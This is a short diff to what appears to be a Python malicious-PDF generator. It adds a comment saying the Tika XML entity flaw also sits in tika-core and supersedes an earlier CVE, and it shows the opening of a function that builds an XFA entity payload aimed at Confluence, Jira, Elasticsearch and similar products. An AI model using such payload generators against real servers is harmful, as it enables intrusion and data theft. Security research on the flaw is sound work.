@@ -3646,6 +3646,8 @@ startxref
 # itself — bypassing parsers that disable general entity expansion.
 # Targets: Confluence, Jira, Bamboo, Bitbucket, Elasticsearch (all use Tika).
 # Fixed in tika-core 3.2.2.
+# Supersedes CVE-2025-54988, which named only tika-parser-pdf-module. The flaw
+# is also in tika-core, so upgrading only the PDF module leaves a host exposed.
 def create_malpdf42(filename, host):
     xfa_payload = (
         '<?xml version="1.0" encoding="UTF-8"?>\n'
